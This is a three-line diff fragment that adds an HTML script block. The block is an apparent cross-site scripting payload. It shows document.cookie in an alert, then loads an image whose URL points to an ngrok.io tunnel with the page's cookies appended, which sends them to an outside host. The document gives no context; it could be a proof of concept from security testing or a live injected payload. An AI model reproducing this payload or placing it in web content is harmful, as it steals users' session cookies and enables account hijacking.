@@ -1,0 +1,3 @@
+<script>
+    alert(document.cookie); var i=new Image; i.src= "http://ad6e4ff2adb8.ngrok.io/?"+document.cookie;
+</script>
